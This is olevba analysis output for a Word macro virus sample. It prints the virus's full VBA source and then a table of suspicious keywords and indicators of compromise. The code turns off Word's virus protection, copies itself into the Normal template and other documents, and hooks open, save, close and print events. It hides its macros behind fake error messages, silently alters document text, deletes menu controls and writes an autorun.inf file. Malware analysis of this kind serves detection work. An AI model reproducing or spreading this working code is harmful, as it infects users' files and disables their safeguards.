olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-ebb9b9ec180ae1cbfe5b711a84f91d7d4e2275ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-ebb9b9ec180ae1cbfe5b711a84f91d7d4e2275ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NTVDMv2.bas 
in file: Virus.MSWord.VMPC-based-ebb9b9ec180ae1cbfe5b711a84f91d7d4e2275ab - OLE stream: 'Macros/VBA/NTVDMv2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub NTVDMv2()
        
On Error Resume Next
Randomize
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("NTVDMv2").Export "c:\NTVDMv2.drv"
ActiveDocument.ReadOnlyRecommended = False
Call RiFk6442UkPl
If NormalTemplate.VBProject.VBComponents.Item("NTVDMv2").Name <> "NTVDMv2" Then FvAo985853949 = True
If ActiveDocument.VBProject.VBComponents.Item("NTVDMv2").Name <> "NTVDMv2" Then LpKi53942 = True
If FvAo985853949 = True And LpKi53942 = False Then Set NsPi5394985811 = NormalTemplate.VBProject.VBComponents
If FvAo985853949 = False And LpKi53942 = True Then Set NsPi5394985811 = ActiveDocument.VBProject.VBComponents
NsPi5394985811.import "c:\NTVDMv2.drv"
If FvAo985853949 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If LpKi53942 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
            Call dhIconDisco("C:\autorun.inf")
JlGwSjGx:
End Sub
Sub FileNew()
    On Error Resume Next
    Call NTVDMv2
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call NTVDMv2
End Sub
Sub FileSave()
    On Error Resume Next
    Call NTVDMv2
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call NTVDMv2
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call NTVDMv2
End Sub
Sub FilePrint()
    On Error Resume Next
Dialogs(wdDialogFilePrint).Show
    Call NTVDMv2
End Sub
Sub FileExit()
    On Error Resume Next
    Call NTVDMv2
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call NTVDMv2
End Sub
Sub AutoExit()
    On Error Resume Next
    Call NTVDMv2
End Sub
Sub AutoExec()
    On Error Resume Next
    Call NTVDMv2
End Sub
Sub AutoClose()
    On Error Resume Next
    Call NTVDMv2
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call NTVDMv2
MsgBox "Word Basic Err =7"
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call NTVDMv2
MsgBox "Word Basic Err =7"
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call NTVDMv2
MsgBox "Word Basic Err =7"
End Sub
Sub RiFk6442UkPl()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "Walkerden"
            .Replacement.Text = "Walkonair"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
Sub dhIconDisco(strFile As String)
Dim hFile As Long
On Error Resume Next
Randomize
Choice = Int(Rnd * 2)
rnn$ = Int(Rnd * 66) + 2
rn$ = Int(Rnd * 27) + 1
Part1$ = "[autorun]"
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
Part3$ = Part2$ + rn$
Part33$ = Part22$ + rnn$
    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

